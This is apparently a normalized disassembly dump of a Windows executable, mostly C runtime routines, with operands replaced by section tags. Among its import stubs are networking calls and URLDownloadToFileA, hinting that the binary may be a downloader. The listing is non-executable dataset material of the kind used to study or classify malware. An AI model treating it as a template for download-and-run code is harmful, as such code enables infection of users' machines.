call sub_41fe6c
push eax
mov [ ebp - 0xc ] eax
call sub_420343
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_42021b
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_410680
mov esi eax
inc esi
push esi
call sub_410212
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_413c11
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
pop edi
pop esi
sub_420270
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_4203d0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_420343
push 0x8
push r--data
call sub_4143e0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_414425
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_4203d0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_420494
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi ecx
mov [ ecx ] 0x2d
inc ecx
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
cmp edx 0x9
jbe r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ ecx ] dl
inc ecx
test eax eax
ja r-xdata
mov dl [ esi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ esi ] al
inc esi
cmp esi ecx
jb r-xdata
pop esi
pop ebp
retn 0x8
sub_4204d8
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
mov ecx [ ebp + 0xc ]
call sub_420494
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_420502
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_420494
mov eax [ ebp + 0xc ]
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_420529
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_4206b9
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_4206b9
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_420613
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420529
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_410cee
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_4206b9
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_40e5f8
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_42076e
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_41e064
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42076e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_4211e0
push 0x4
call sub_40fd2d
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
mov [ eax ] rw-data
jmp r-xdata
push sub_4212e0
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
call sub_40eaf5
pop ecx
retn
sub_421250
push ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push ecx
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_40f2fb
add esp 0x8
retn
mov ecx [ esp ]
mov edx [ rw-data ]
push ecx
push edx
call sub_40b0b0
mov eax [ rw-data ]
push eax
call sub_40f2fb
add esp 0xc
sub_401000
mov [ ecx ] r--data
jmp sub_40e8ad
sub_401010
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40e8ad
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40f2fb
add esp 0x4
sub_401040
retn
sub_401140
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_401150
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_4010d0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_401170
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_4010d0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_401220
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_401240
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_408657
mov esi [ ebp + 0x8 ]
call sub_4091c0
push 0x0
push 0x0
call sub_41070b
int3
sub_408a60
mov eax [ rw-data ]
push eax
call sub_40f2fb
pop ecx
retn
sub_408a70
mov ecx [ eax ]
push ecx
call sub_40f2fb
pop ecx
retn
sub_409630
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_401240
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4099c0
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
call sub_40b0b0
add esp 0x8
retn 0x4
sub_409fb0
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
retn
mov eax [ esi + 0x4 ]
push eax
call sub_40f2fb
add esp 0x4
sub_40a6e0
mov ecx [ ebp - 0x14 ]
push ecx
call sub_40f2fb
add esp 0x4
push 0x0
push 0x0
call sub_41070b
int3
sub_40ae10
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x45 ] 0x0
je r-xdata
sub_40af60
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_40e850
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_40d740
cmp [ eax + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call sub_410135
pop ecx
sub_40e1ab
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40fd2d
gethostbyname
jmp [ gethostbyname@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostname
jmp [ gethostname@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
sub_40e57e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0x1
call sub_40e2c9
pop ecx
pop ebp
retn
sub_40e7cf
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_40e833
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_40e8ad
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_410135
pop ecx
sub_40e8c3
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40e9c3
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40e9ad
sub_40eaef
call sub_41414c
retn
sub_40eaf5
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40eab9
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40eb49
push 0xc
push r--data
call sub_4143e0
call sub_41371e
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_40eb0c
sub_40eb7e
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_41435d
int3
sub_40ecbd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40ee1a
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40edf4
add esp 0x14
retn
sub_40eee4
push [ ebp + 0x8 ]
call sub_414a54
pop ecx
retn
sub_40eeee
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ee2a
add esp 0xc
pop ebp
retn
sub_40f2a0
push [ ebp + 0x18 ]
call sub_414a54
pop ecx
retn
sub_40f2aa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40f214
add esp 0x14
pop ebp
retn
sub_40f2c7
mov edi edi
push ebp
mov ebp esp
call sub_41371e
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_40f2d9
call sub_41371e
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_40f55d
push [ ebp + 0x14 ]
call sub_414a54
pop ecx
retn
sub_40f768
push [ ebp + 0x8 ]
call sub_414a54
pop ecx
retn
sub_40f877
push [ ebp + 0x8 ]
call sub_414a54
pop ecx
retn
sub_40f92c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_40f881
pop ecx
pop ecx
pop ebp
retn
sub_40f93f
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_41718e
pop ecx
retn
sub_40fcb9
push esi
call sub_414a54
pop ecx
retn
sub_40fd12
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_40e833
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_41018b
push 0x4
call sub_417c49
pop ecx
retn
sub_410209
push 0x4
call sub_417c49
pop ecx
retn
sub_410420
push 0x4
call sub_417c49
pop ecx
retn
sub_410634
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_41471e
pop ecx
pop ecx
retn
sub_410648
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_414382
push eax
call sub_41435d
sub_410662
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_414425
retn
_start
call sub_418f07
jmp sub_410520
sub_41207f
mov eax rw-data
retn
sub_412085
mov eax rw-data
retn
sub_41208b
mov eax rw-data
retn
sub_412091
mov eax rw-data
retn
sub_412097
mov edi edi
push ebp
mov ebp esp
call sub_41207f
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4120a8
mov edi edi
push ebp
mov ebp esp
call sub_412085
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_4120b9
mov edi edi
push ebp
mov ebp esp
call sub_41208b
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_412376
push 0x7
call sub_417c49
pop ecx
retn
sub_412825
push 0x6
call sub_417c49
pop ecx
retn
sub_412866
push 0x6
call sub_417c49
pop ecx
retn
sub_412cd3
push 0xd
call sub_417c49
pop ecx
retn
sub_41309e
push 0xd
call sub_417c49
pop ecx
retn
sub_4130d7
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_412f3d
pop ecx
mov [ rw-data ] 0x1
sub_41340e
push 0xc
call sub_417c49
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_413507
call [ TlsAlloc@IAT ]
retn 0x4
sub_413510
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_41352a
mov eax [ rw-data ]
retn
sub_413564
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_413495
pop ecx
call eax
pop ebp
retn 0x8
sub_413693
push 0xd
call sub_417c49
pop ecx
retn
sub_41369c
push 0xc
call sub_417c49
pop ecx
retn
sub_413852
push 0xd
call sub_417c49
pop ecx
retn
sub_41385e
push 0xc
call sub_417c49
pop ecx
retn
sub_41409e
push 0x4
call sub_417c49
pop ecx
retn
sub_41412b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_414100
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_414143
push 0x8
call sub_417d23
pop ecx
retn
sub_41414c
push 0x8
call sub_417c49
pop ecx
retn
sub_414332
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_417c49
pop ecx
sub_414347
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_41421b
add esp 0xc
pop ebp
retn
sub_41435d
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_41421b
add esp 0xc
pop ebp
retn
sub_414373
push 0x1
push 0x0
push 0x0
call sub_41421b
add esp 0xc
retn
sub_414382
push 0x1
push 0x1
push 0x0
call sub_41421b
add esp 0xc
retn
sub_414425
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_4146eb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_41471d
retn
sub_41487e
and [ rw-data ] 0x0
retn
sub_41490a
mov eax rw-data
retn
sub_4149c1
call sub_4165be
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_410135
pop ecx
retn
call sub_41b2ee
sub_414eb7
push 0x1
call sub_417c49
pop ecx
retn
sub_414f96
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_414ec0
add esp 0xc
pop ebp
retn 0x4
sub_414fc9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_41c079
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_414ffc
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_414ec0
add esp 0xc
pop ebp
retn 0x8
sub_4158ab
push [ ebp + 0x8 ]
call sub_41778d
pop ecx
retn
sub_41642a
push [ ebp + 0x8 ]
call sub_41778d
pop ecx
retn
sub_416586
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_414a90
pop ecx
pop ecx
retn
sub_4165b5
push 0x1
call sub_417c49
pop ecx
retn
sub_4165be
push 0x1
call sub_4164e4
pop ecx
retn
sub_416804
xor eax eax
inc eax
retn
sub_416962
push [ ebp + 0x8 ]
call sub_41778d
pop ecx
retn
sub_416a13
mov eax sub_41d8ec
mov [ rw-data ] eax
mov [ rw-data ] sub_41cfd3
mov [ rw-data ] sub_41cf87
mov [ rw-data ] sub_41cfc0
mov [ rw-data ] sub_41cf29
mov [ rw-data ] eax
mov [ rw-data ] sub_41d864
mov [ rw-data ] sub_41cf45
mov [ rw-data ] sub_41cea7
mov [ rw-data ] sub_41ce34
retn
sub_416a73
mov edi edi
push ebp
mov ebp esp
call sub_416a13
call sub_41d978
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_41d90f
sub_4171f5
push 0xe
call sub_417c49
pop ecx
retn
sub_41730c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41db6f
add esp 0x14
pop ebp
retn
sub_417488
push [ ebp + 0x8 ]
call sub_41778d
pop ecx
retn
sub_417538
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_417784
push 0xa
call sub_417c49
pop ecx
retn
sub_417887
push 0xa
call sub_417c49
pop ecx
retn
sub_417945
push 0xb
call sub_417c49
pop ecx
retn
sub_417ab8
push 0xc
push r--data
call sub_4143e0
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_414425
retn
sub_417ad5
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_417b6a
call sub_417b08
mov [ rw-data ] eax
xor eax eax
retn
sub_417c49
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417d1a
push 0xa
call sub_417c49
pop ecx
retn
sub_418a43
push sub_418a01
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_418fbb
mov [ ecx ] r--data
jmp sub_40e8ad
sub_419117
push [ ebp - 0x14 ]
call sub_41904c
pop ecx
retn
sub_41915b
call sub_41371e
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_41371e
add eax 0x90
dec [ eax ]
sub_4191fe
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_419207
mov esp [ ebp - 0x18 ]
call sub_419c56
sub_4192b4
push 0x4
mov eax sub_4207f3
call sub_410b70
call sub_41371e
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_419c8f
call sub_419ca2
sub_41938d
mov eax [ ebp - 0x14 ]
call sub_419176
retn
sub_419604
xor eax eax
inc eax
retn
sub_419608
mov esp [ ebp - 0x18 ]
call sub_419c56
sub_41969d
xor eax eax
inc eax
retn
sub_4196a1
mov esp [ ebp - 0x18 ]
call sub_419c56
sub_419b53
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40e850
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_419c56
push 0x8
push r--data
call sub_4143e0
call sub_41371e
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41df44
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_419c76
xor eax eax
inc eax
retn
sub_419c8f
call sub_41371e
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_419c56
call eax
sub_419cc6
xor eax eax
inc eax
retn
sub_419cda
push sub_419c56
call sub_41341a
pop ecx
mov [ rw-data ] eax
retn
sub_419ed0
push [ ebp + 0x8 ]
call sub_41778d
pop ecx
retn
sub_419fa8
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_41a12a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419fbe
add esp 0x14
pop ebp
retn
sub_41a17f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_41a147
pop ecx
pop ecx
pop ebp
retn
sub_41a371
call sub_41371e
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4133a4
sub_41aecc
push 0x4
call sub_417c49
pop ecx
retn
sub_41af69
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_41afbe
push [ rw-data ]
call sub_413495
pop ecx
retn
sub_41b13f
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_417c49
pop ecx
sub_41b17b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41b18a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41b199
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41b1c9
mov eax [ ebp - 0x14 ]
